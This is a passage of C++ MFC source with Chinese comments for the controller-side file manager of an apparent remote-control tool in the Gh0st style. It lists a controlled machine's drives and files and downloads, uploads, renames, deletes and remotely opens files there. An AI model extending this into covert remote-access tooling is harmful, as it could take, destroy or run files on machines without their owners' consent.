				p++;
			}
		}

		while(*p)
		{
			if(*p == TEXT('\\'))
			{
				*p = TEXT('\0');
				dwAttributes = GetFileAttributes(pszDirCopy);
				if(dwAttributes == 0xffffffff)
				{
					if(!CreateDirectory(pszDirCopy, NULL))
					{
						if(GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(pszDirCopy);
							return FALSE;
						}
					}
				}
				else
				{
					if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(pszDirCopy);
						return FALSE;
					}
				}

				*p = TEXT('\\');
			}

			p = CharNext(p);
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		free(pszDirCopy);
		return FALSE;
	}

	free(pszDirCopy);
	return TRUE;
}




///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////从主控端传输文件到被控端如果是文件就插入到任务列表如果是文件夹就递归
bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)      // C: 1.txt  A\2.txt  A\3.txt      C:\1.txt  C;\A\2.txt  C:\A\3.txt
{
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";

	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);


	WIN32_FIND_DATA	wfd;
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;

	do
	{ 
		if (wfd.cFileName[0] == '.') 
			continue; // 过滤这两个目录 '.'和'..'
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{ 
			char strDirectory[MAX_PATH];
			wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			FixedUploadDirectory(strDirectory); // 如果找到的是目录，则进入此目录进行递归 
		} 
		else 
		{ 
			CString file;
			file.Format("%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			m_Remote_Upload_Job.AddTail(file);
			// 对文件进行操作 
		} 
	} while (FindNextFile(hFind, &wfd)); 
	FindClose(hFind); // 关闭查找句柄
	return true;
}



void CFileManagerDlg::SendFileData()
{
	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	ShowProgress();                        //通知进度条


	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop)     //pFileSize->dwSizeLow == -1  是对方选择了跳过    m_nCounter == m_nOperatingFileLength  完成当前的传输
	{
		EndLocalUploadFile();              //进行下个任务的传送如果存在
		return;
	}


	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN); //8183   4G

	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;  //8192-9
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);

	// Token,  大小，偏移，数据

	lpBuffer[0] = COMMAND_FILE_DATA;

	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	

	// 返回值
	bool	bRet = true;    //8183   1
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	//COMMAND_FILE_DATA 0  0  8183   8183        //1


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;    //8192
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);  //10
	}
	LocalFree(lpBuffer);
}



void CFileManagerDlg::SendStop()
{
	BYTE	bBuff = COMMAND_STOP;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}



//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//被控端

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////被控端的跟新驱动器列表
void CFileManagerDlg::FixedRemoteDriveList()
{
	// 加载系统统图标列表 设置驱动器图标列表
	HIMAGELIST hImageListLarge = NULL;
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(&hImageListLarge, &hImageListSmall);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_list_remote.DeleteAllItems();
	// 重建Column
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "总大小", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "可用空间", LVCFMT_LEFT, 115);


	char	*pDrive = NULL;
	pDrive = (char *)m_bRemoteDriveList;   //已经去掉了消息头的1个字节了

	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间
	char				VolName[MAX_PATH];
	char				FileSystem[MAX_PATH];

	/*    //系统光标的索引 大概是这样的
	6	DRIVE_FLOPPY
	7	DRIVE_REMOVABLE
	8	DRIVE_FIXED
	9	DRIVE_REMOTE
	10	DRIVE_REMOTE_DISCONNECT
	11	DRIVE_CDROM
	*/
	int	nIconIndex = -1;
	//用一个循环遍历所有发送来的信息，先是到列表中
	for (int i = 0; pDrive[i] != '\0';)   //C Type
	{
		//由驱动器名判断图标的索引
		if (pDrive[i] == 'A' || pDrive[i] == 'B')
		{
			nIconIndex = 6;
		}
		else
		{
			switch (pDrive[i + 1])   //这里是判断驱动类型 查看被控端
			{
			case DRIVE_REMOVABLE:
				nIconIndex = 7;
				break;
			case DRIVE_FIXED:
				nIconIndex = 8;
				break;
			case DRIVE_REMOTE:
				nIconIndex = 9;
				break;
			case DRIVE_CDROM:
				nIconIndex = 11;
				break;
			default:
				nIconIndex = 8;
				break;		
			}
		}
		//显示驱动器名
		CString	str;
		str.Format("%c:\\", pDrive[i]);  //C Type    c:
		int	nItem = m_list_remote.InsertItem(i, str, nIconIndex);    //Insert   Set
		m_list_remote.SetItemData(nItem, 1);
	    //显示驱动器大小
		memcpy(&AmntMB, pDrive + i + 2, 4);
		memcpy(&FreeMB, pDrive + i + 6, 4);
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_remote.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_remote.SetItemText(nItem, 3, str);
		
		i += 10;

		char	*lpFileSystemName = NULL;
		char	*lpTypeName = NULL;

		lpTypeName = pDrive + i;
		i += lstrlen(pDrive + i) + 1;
		lpFileSystemName = pDrive + i;

		// 磁盘类型, 为空就显示磁盘名称
		if (lstrlen(lpFileSystemName) == 0)
		{
			m_list_remote.SetItemText(nItem, 1, lpTypeName);
		}
		else
		{
			m_list_remote.SetItemText(nItem, 1, lpFileSystemName);
		}


		i += lstrlen(pDrive + i) + 1;
	}
	// 重置远程当前路径
	
	m_Remote_Directory_ComboBox.ResetContent();

}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////在ListRemote控件上的双击消息
void CFileManagerDlg::OnDblclkListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
		return;

	GetRemoteFileList();
	*pResult = 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////在ListRemote控件上的右键弹出菜单消息
void CFileManagerDlg::OnNMRClickListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	int	nRemoteOpenMenuIndex = 5;
	CListCtrl	*pListCtrl = &m_list_remote;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);
	if (pListCtrl->GetSelectedCount() == 0)
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// 是文件夹
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION| MF_GRAYED);    //xian    yin
		else
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);


	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////在ListRemote的重命名完成消息
void CFileManagerDlg::OnLvnEndlabeleditListRemote(NMHDR *pNMHDR, LRESULT *pResult)    //重命名
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);

	CString str, strExistingFileName, strNewFileName;
	m_list_remote.GetEditControl()->GetWindowText(str);

	strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Remote_Path + str;

	if (strExistingFileName != strNewFileName)
	{
		UINT nPacketSize = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
		lpBuffer[0] = COMMAND_RENAME_FILE;                                                                   //向被控端发送消息
		memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() + 1);
		memcpy(lpBuffer + 2 + strExistingFileName.GetLength(), 
			strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}
	*pResult = 1;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////被控端文件列表
void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
{
	// 重新设置ImageList
	SHFILEINFO	sfi;
	HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	// 重建标题
	m_list_remote.DeleteAllItems();
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);


	int	nItemIndex = 0;
	m_list_remote.SetItemData
		(
		m_list_remote.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);
	/*
	ListView 消除闪烁
	更新数据前用SetRedraw(FALSE)   
	更新后调用SetRedraw(TRUE)
	*/
	m_list_remote.SetRedraw(FALSE);

	if (dwBufferLen != 0)
	{
		// 遍历发送来的数据显示到列表中
		for (int i = 0; i < 2; i++)
		{
			// 跳过Token，共5字节
			char *pList = (char *)(pbBuffer + 1);			
			for(char *pBase = pList; pList - pBase < dwBufferLen - 1;)
			{
				char	*pszFileName = NULL;
				DWORD	dwFileSizeHigh = 0; // 文件高字节大小
				DWORD	dwFileSizeLow = 0;  // 文件低字节大小
				int		nItem = 0;
				bool	bIsInsert = false;
				FILETIME	ftm_strReceiveLocalFileTime;

				int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i 为 0 时，列目录，i为1时列文件
				bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
				pszFileName = ++pList;

				if (bIsInsert)
				{
					nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
					m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
					SHFILEINFO	sfi;
					SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
					m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
				}

				// 得到文件大小
				pList += lstrlen(pszFileName) + 1;
				if (bIsInsert)
				{
					memcpy(&dwFileSizeHigh, pList, 4);
					memcpy(&dwFileSizeLow, pList + 4, 4);
					CString strSize;
					strSize.Format("%10d KB", (dwFileSizeHigh * (MAXDWORD+1)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
					m_list_remote.SetItemText(nItem, 1, strSize);
					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
					CTime	time(ftm_strReceiveLocalFileTime);
					m_list_remote.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));	
				}
				pList += 16;
			}
		}
	}

	m_list_remote.SetRedraw(TRUE);
	// 恢复窗口
	m_list_remote.EnableWindow(TRUE);
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////从被控端传输文件到主控端创建文件
void CFileManagerDlg::CreateLocalRecvFile()
{
	// 重置计数器
	m_nCounter = 0;

	CString	strDestDirectory = m_Local_Path;   //Com_Box  
	// 如果本地也有选择，当做目标文件夹
	int nItem = m_list_local.GetSelectionMark();

	// 是文件夹
	if (nItem != -1 && m_list_local.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_local.GetItemText(nItem, 0) + "\\";
	}

	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}

	FILESIZE	*pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
	DWORD	dwSizeLow = pFileSize->dwSizeLow;

	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;

	// 当前正操作的文件名
	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);

	m_strReceiveLocalFile = m_strOperatingFile;

	// 得到要保存到的本地的文件路径
	m_strReceiveLocalFile.Replace(m_Remote_Path, strDestDirectory);   //D:\HelloWorld     C:\HelloWorld    D:\HelloWorld

	// 创建多层目录
	MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));


	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);    //1.txt


	//5  jmpAll  jmp  (-1)                over  overAll  ()  -->Dlg   Dlg  Dlg






	//判断文件是否存在 ，传输的任务是什么
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{

		CFileTransferModeDlg	dlg(this);
		dlg.m_strFileName = m_strReceiveLocalFile;
		//如果本地存在该同名文件时的处理
		switch (dlg.DoModal())
		{
		case IDC_OVERWRITE:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE;
			break;
		case IDC_OVERWRITE_ALL:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
			break;
		case IDC_JUMP:
			m_nTransferMode = TRANSFER_MODE_JUMP;
			break;
		case IDC_JUMP_ALL:
			m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
			break;
		case IDCANCEL:
			m_nTransferMode = TRANSFER_MODE_CANCEL;
			break;
		}
	}


	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		// 取消传送
		m_bIsStop = true;
		SendStop();

		Sleep(10);

		return;
	}
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	//得到文件大小
	//1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = COMMAND_CONTINUE;          //要发送的数据头

	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{

		// 覆盖
		if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;   

		}
		// 跳过，指针移到-1
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			m_ProgressCtrl->SetPos(100);
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	//创建文件
	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nOperatingFileLength = 0;
		m_nCounter = 0;
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " 文件创建失败", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	CloseHandle(hFile);

	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		// 发送继续传输文件的token,包含文件续传的偏移 服务端搜索COMMAND_CONTINUE
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////从被控端传输文件到主控端当前文件文件已经接收完毕
void CFileManagerDlg::EndLocalRecvFile()   
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Download_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Download_Job.RemoveAll();
		m_bIsStop = false;
		// 重置传输方式
		m_nTransferMode = TRANSFER_MODE_NORMAL;	
		EnableControl(TRUE);
		FixedLocalFileList(".");

		m_ProgressCtrl->SetPos(0);
		
	}
	else
	{
	
		Sleep(5);
		SendDownloadJob();
	}
	return;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////从被控端传输文件到主控端将数据写入文件
void CFileManagerDlg::WriteLocalRecvFile()
{

	// 传输完毕
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	// 得到数据的偏移
	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);

	pFileSize = (FILESIZE *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	// 得到数据在文件中的偏移, 赋值给计数器
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;


	dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	//打开文件
	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);

	//指向文件偏移 ，这个偏移是每次数据大小的累加
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nRet = 0;
	int i;
	//写入文件
	for ( i = 0; i < MAX_WRITE_RETRY; i++)
	{
		// 写入文件
		nRet = WriteFile
			(
			hFile,
			pData, 
			dwBytesToWrite, 
			&dwBytesWrite,
			NULL
			);
		if (nRet > 0)
		{
			break;
		}
	}

	if (i == MAX_WRITE_RETRY && nRet <= 0)
	{
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " 文件写入失败", "警告", MB_OK|MB_ICONWARNING);
	}
	CloseHandle(hFile);
	// 为了比较，计数器递增
	m_nCounter += dwBytesWrite;
	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		BYTE	bToken[9];
		bToken[0] = COMMAND_CONTINUE;
		dwOffsetLow += dwBytesWrite;       //这里就是文件指针的那个偏移度了，每次递加
		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}

	
}









void CFileManagerDlg::GetRemoteFileList(CString directory)   //NULL   ..  .
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_remote.GetSelectionMark();

		// 如果有选中的，是目录
		if (nItem != -1)
		{
			if (m_list_remote.GetItemData(nItem) == 1)
			{
				directory = m_list_remote.GetItemText(nItem, 0);
			}
		}
		// 从组合框里得到路径    // 
		else
		{
			m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);  //m_Remote_Path
		}
	}
	// 得到父目录
	if (directory == "..")
	{
		m_Remote_Path = GetParentDirectory(m_Remote_Path);
	}
	else if (directory != ".")
	{	
		m_Remote_Path += directory;   
		if(m_Remote_Path.Right(1) != "\\")
			m_Remote_Path += "\\";
	}

	// 是驱动器的根目录,返回磁盘列表
	if (m_Remote_Path.GetLength() == 0)
	{
		FixedRemoteDriveList();   //1024
		return;
	}

	// 发送数据前清空缓冲区

	int	PacketSize = m_Remote_Path.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, PacketSize);   //D:\
	//将COMMAND_LIST_FILES  发送到控制端，到控制搜索
	bPacket[0] = COMMAND_LIST_FILES;
	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, PacketSize);
	LocalFree(bPacket);

	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);   
	m_Remote_Directory_ComboBox.SetCurSel(0);

	// 得到返回数据前禁窗口
	m_list_remote.EnableWindow(FALSE);  //true   ark 
	m_ProgressCtrl->SetPos(0);   //进度条
}







void CFileManagerDlg::OnRemoteBigicon()
{
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}


void CFileManagerDlg::OnRemoteSmallicon()
{
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}


void CFileManagerDlg::OnRemoteList()
{
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
}


void CFileManagerDlg::OnRemoteReport()
{
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}








void CFileManagerDlg::OnIdtRemotePrev()                                                  //真彩返回上层目录
{
	GetRemoteFileList("..");
}




void CFileManagerDlg::OnIdtRemoteDelete()                                                //真彩菜单的删除功能
{
	m_bIsUpload = false;
	
	CString str;
	if (m_list_remote.GetSelectedCount() > 1)
		str.Format("确定要将这 %d 项删除吗?", m_list_remote.GetSelectedCount());
	else
	{
		CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

		int a = m_list_remote.GetSelectionMark();

		if (a==-1)
		{
			return;
		}
		if (m_list_remote.GetItemData(a) == 1)
			str.Format("确实要删除文件夹“%s”并将所有内容删除吗?", file);
		else
			str.Format("确实要把“%s”删除吗?", file);
	}
	if (::MessageBox(m_hWnd, str, "确认删除", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	m_Remote_Delete_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);                 //当用户选择有多项的删除 我们要把要删除的多项维护在数据结构中进行发送
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_remote.GetItemData(nItem))   //真 文件夹   假 文件     // C:\Hello\1.txt C:\Hello\
			file += '\\';

		m_Remote_Delete_Job.AddTail(file);   //模块链表  
	}

	EnableControl(FALSE);

	SendDeleteJob();                      //发送删除第一个项任务
}

// 发出一个删除任务
BOOL CFileManagerDlg::SendDeleteJob()
{
	if (m_Remote_Delete_Job.IsEmpty())
		return FALSE;
	// 发出第一个删除任务命令
	CString file = m_Remote_Delete_Job.GetHead();   //C:\Hello\2.txt
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);

	if (file.GetAt(file.GetLength() - 1) == '\\')    //给定一个索引 返回字符
	{
		
		bPacket[0] = COMMAND_DELETE_DIRECTORY;
	}
	else
	{
		
		bPacket[0] = COMMAND_DELETE_FILE;
	}
	// 文件偏移，续传时用
	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);   //COMMAND_DELETE_DIRECTORY:\hello\2.txt
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	// 从删除任务列表中删除自己
	m_Remote_Delete_Job.RemoveHead();  //
	return TRUE;
}


void CFileManagerDlg::EndRemoteDeleteFile()                     //删除下一个任务如果还有的化
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");


	}
	else
	{
		//sleep下会出错,可能以前的数据还没send出去
		Sleep(5);
		SendDeleteJob();
	}
	return;
}


void CFileManagerDlg::OnIdtRemoteNewfolder()                   //真彩菜单的添加文件夹功能
{
	if (m_Remote_Path == "")
		return;
	
	CInputDialog	dlg;

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		CString file = m_Remote_Path + dlg.m_str + "\\";
		UINT	nPacketSize = file.GetLength() + 2;
		// 创建多层目录
		LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
		lpBuffer[0] = COMMAND_CREATE_FOLDER;
		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
}



void CFileManagerDlg::OnIdtRemoteStop()                       //真彩菜单的Stop功能
{
	 m_bIsStop = true;
}


void CFileManagerDlg::OnIdtRemoteCopy()                       //真彩菜单的传送文件到主控端
{
	m_bIsUpload = false;
	// 禁用文件管理窗口
	EnableControl(FALSE);
	
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	
	m_Remote_Download_Job.RemoveAll();   //链表  t 2.tx1.tx
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
	//得到远程文件名
	while(pos)   //  
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_remote.GetItemData(nItem))
			file += '\\';
		// 添加到下载任务列表中去
		m_Remote_Download_Job.AddTail(file);
	} 
	//发送第一个任务
	SendDownloadJob();
}

BOOL CFileManagerDlg::SendDownloadJob()
{

	if (m_Remote_Download_Job.IsEmpty())
		return FALSE;

	// 发出第一个任务命令
	CString file = m_Remote_Download_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	bPacket[0] = COMMAND_DOWN_FILES;

	memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	// 从下载任务列表中删除自己
	m_Remote_Download_Job.RemoveHead();
	//在被控端搜索COMMAND_DOWN_FILES
	return TRUE;
}



void CFileManagerDlg::OnRemoteOpenShow()																						//远程运行显示     
{
	
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

	int		nPacketLength = str.GetLength() + 2;
	BYTE	lpPacket[MAX_PATH+10];
	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
